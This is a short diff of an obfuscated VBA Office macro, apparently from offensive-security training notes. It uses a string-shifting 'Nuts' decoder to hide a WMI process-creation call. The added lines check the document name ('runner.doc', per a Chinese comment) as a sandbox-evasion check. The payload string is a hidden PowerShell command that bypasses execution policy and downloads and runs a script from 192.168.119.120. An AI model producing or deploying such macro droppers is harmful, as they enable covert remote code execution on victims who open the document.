@@ -31,8 +31,10 @@ Sub MyMacro()
     Water = Nuts(Apples)
     GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
 End Sub
-
-
+If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then 
+  Exit Function
+End If
+//Nuts("131134127127118131063117128116")为runner.doc
 //加密$payload
 
 $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
